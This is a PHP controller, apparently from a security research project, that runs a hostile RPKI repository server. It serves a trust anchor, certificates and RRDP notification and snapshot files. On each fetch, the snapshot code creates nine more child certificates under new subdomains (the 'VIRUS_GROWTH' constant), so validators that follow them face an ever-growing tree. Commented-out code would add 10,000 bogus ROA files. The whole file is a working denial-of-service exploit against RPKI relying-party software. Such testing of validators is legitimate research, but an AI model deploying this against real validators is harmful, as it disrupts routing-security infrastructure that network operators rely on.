<?php

namespace koenvh\RPKI;


use Laminas\Diactoros\Response;
use Ramsey\Uuid\Uuid;
use XMLWriter;

class HController
{
    private string $domain = "h.rprp.nlnetlabs.net";
    private string $sessionId = "23e3c698-2ead-4386-b3be-b04b73f364c1";
    private string $serial = "1337";
    private string $state = "1";

    private const VIRUS_GROWTH = 10;
    private const ROA_COUNT = 10_000;

    function __construct() {
        $this->domain = $_SERVER['SERVER_NAME'];
        preg_match('/h([^-]*)-([^.]+)\./', $this->domain, $matches);
        if ($matches[1]) {
            $this->state = $matches[1];
        }
        $this->sessionId = $matches[2];
    }

    function tal() {
        $openSSL = new OpenSSL();

        if (!($content = $openSSL->retrieveTal($this->domain))) {
            $privateKey = null;
            $certificate = null;
            $openSSL->generateCertificate($this->domain, $certificate, $privateKey);
            $publicKey = $openSSL->getPublicKey($privateKey);
            $publicKey = $openSSL->stripPublicKey($publicKey);

            $content = "https://$this->domain/ta/ta.cer\nrsync://$this->domain/ta/ta.cer\n\n$publicKey";
            $openSSL->storePrivateKey($this->domain, $privateKey);
            $openSSL->storeCertificate($this->domain, $certificate);
            $openSSL->storeTal($this->domain, $content);
        }

        return new Response\TextResponse($content, 200, [
            "Content-Type" => "text/plain"
        ]);
    }

    function cer() {
        $openSSL = new OpenSSL();
        return new Response\TextResponse($openSSL->retrieveCertificate($this->domain), 200, [
            "Content-Type" => "application/octet-stream"
        ]);
    }

    function notification() {
        $uniqid = "bazinga";

        $xml = new XMLWriter();
        $xml->openMemory();
        $xml->setIndent(true);
        $xml->startElement("notification");
        $xml->writeAttribute("version", "1");
        $xml->writeAttribute("session_id", $this->sessionId);
        $xml->writeAttribute("serial", $this->serial);
        $xml->writeAttribute("xmlns", "http://www.ripe.net/rpki/rrdp");
        $xml->startElement("snapshot");
        $xml->writeAttribute("uri", "https://$this->domain/$uniqid/snapshot.xml");
        $xml->writeAttribute("hash", hash("sha256", $this->snapshot($uniqid)->getBody()->getContents()));
        $xml->endElement();

        $xml->startElement("delta");
        $xml->writeAttribute("serial", $this->serial);
        $xml->writeAttribute("uri", "https://$this->domain/1337/delta.xml");
        $xml->writeAttribute("hash", hash("sha256", $this->delta("1337")->getBody()->getContents()));
        $xml->endElement();

        $xml->endElement();

        return new Response\TextResponse($xml->outputMemory(), 200, [
            "Content-Type" => "text/xml",
            "Last-Modified" => gmdate("D, d M Y H:i:s") . " GMT",
            "Expires" => gmdate("D, d M Y H:i:s") . " GMT",
            "Cache-Control" => "max-age=60"
        ]);
    }

    function snapshot($uniqid) {
        ini_set("memory_limit", "2048M");

        $openSSL = new OpenSSL();

        $firstRun = !$openSSL->retrieveManifest($this->domain, 1);
        if ($firstRun) {
            $initialCrl = $openSSL->generateCrl(
                $openSSL->retrieveCertificate($this->domain, 1),
                $openSSL->retrievePrivateKey($this->domain, 1),
                $this->domain
            );
            $openSSL->storeCrl($this->domain, $initialCrl, 1);

            $fileList = [
                [
                    "file" => "koenvh.crl",
                    "hash" => hash("sha256", base64_decode($openSSL->retrieveCrl($this->domain, 1)))
                ]
            ];

            if (strlen($this->state) < 20) {
                for ($i = 1; $i < self::VIRUS_GROWTH; $i++) {
                    $newDomain = "h" . $this->state . "q" . $i . "-" . $this->sessionId . "." . DOMAIN;
                    $openSSL->generateCertificate($newDomain, $subCertificate, $subPrivateKey, false, $this->domain, "koenvh", "koenvh");
                    $openSSL->storePrivateKey($newDomain, $subPrivateKey, 1);
                    $openSSL->storeCertificate($newDomain, $subCertificate, 1);

                    $fileList[] = [
                        "file" => "koenvh$i.cer",
                        "hash" => hash("sha256", $openSSL->retrieveCertificate($newDomain, 1))
                    ];
                }
            }
//            $roaHash = hash("sha256", base64_decode("AA=="));
//            for ($i = 0; $i < self::ROA_COUNT; $i++) {
//                $filesList[] = [
//                    "file" => "koenvh$i.roa",
//                    "hash" => $roaHash
//                ];
//            }

            $initialManifest = $openSSL->generateManifest($fileList, $openSSL->retrievePrivateKey($this->domain, 1), $this->domain, $this->domain, "koenvh", "koenvh", $mftCertificate);
            $openSSL->storeCertificate($this->domain, $mftCertificate, 444);
            $openSSL->storeManifest($this->domain, $initialManifest, 1);

//            $subCrl = $openSSL->generateCrl(
//                $openSSL->retrieveCertificate($this->domain, 2),
//                $openSSL->retrievePrivateKey($this->domain, 2),
//                $this->domain,
//                $this->domain,
//                "koenvh1",
//                "koenvh"
//            );
//            $openSSL->storeCrl($this->domain, $subCrl, 2);
//
//            $subManifest = $openSSL->generateManifest([
//                [
//                    "file" => "koenvh.crl",
//                    "hash" => hash("sha256", base64_decode($openSSL->retrieveCrl($this->domain, 1)))
//                ],
//                [
//                    "file" => "koenvh2.cer",
//                    "hash" => hash("sha256", $openSSL->retrieveCertificate($this->domain, 2))
//                ]
//            ], $openSSL->retrievePrivateKey($this->domain, 2), $this->domain, $this->domain, "koenvh1", "koenvh");
//            $openSSL->storeManifest($this->domain, $subManifest, 2);
        }

        $xml = new XMLWriter();
        $xml->openMemory();
        $xml->setIndent(true);

        $xml->startElement("snapshot");
        $xml->writeAttribute("version", "1");
        $xml->writeAttribute("session_id", $this->sessionId);
        $xml->writeAttribute("serial", $this->serial);
        $xml->writeAttribute("xmlns", "http://www.ripe.net/rpki/rrdp");

        $xml->startElement("publish");
        $xml->writeAttribute("uri", "rsync://$this->domain/repository/koenvh.cer");
        $xml->writeRaw(base64_encode($openSSL->retrieveCertificate($this->domain, 444)));
        $xml->endElement();

        $xml->startElement("publish");
        $xml->writeAttribute("uri", "rsync://$this->domain/repository/koenvh.crl");
        $xml->writeRaw($openSSL->retrieveCrl($this->domain, 1));
        $xml->endElement();

        $xml->startElement("publish");
        $xml->writeAttribute("uri", "rsync://$this->domain/repository/koenvh.mft");
        $xml->writeRaw($openSSL->retrieveManifest($this->domain, 1));
        $xml->endElement();

        if (strlen($this->state) < 20) {
            for ($i = 1; $i < self::VIRUS_GROWTH; $i++) {
                $newDomain = "h" . $this->state . "q" . $i . "-" . $this->sessionId . "." . DOMAIN;
                $xml->startElement("publish");
                $xml->writeAttribute("uri", "rsync://$this->domain/repository/koenvh$i.cer");
                $xml->writeRaw(base64_encode($openSSL->retrieveCertificate($newDomain, 1)));
                $xml->endElement();
            }
        }

//        for ($i = 0; $i < self::ROA_COUNT; $i++) {
//            $xml->startElement("publish");
//            $xml->writeAttribute("uri", "rsync://$this->domain/repository/koenvh$i.roa");
//            $xml->writeRaw("AA==");
//            $xml->endElement();
//        }

        $xml->endElement();

        return new Response\TextResponse($xml->outputMemory(), 200, [
            "Content-Type" => "text/xml",
            "Last-Modified" => gmdate("D, d M Y H:i:s") . " GMT",
            "Expires" => gmdate("D, d M Y H:i:s") . " GMT",
            "Cache-Control" => "max-age=60"
        ]);
    }

    function delta($i) {
        return new Response\TextResponse("", 200, [
            "Content-Type" => "text/xml",
            "Last-Modified" => gmdate("D, d M Y H:i:s") . " GMT",
            "Expires" => gmdate("D, d M Y H:i:s") . " GMT",
            "Cache-Control" => "max-age=60"
        ]);
    }
}
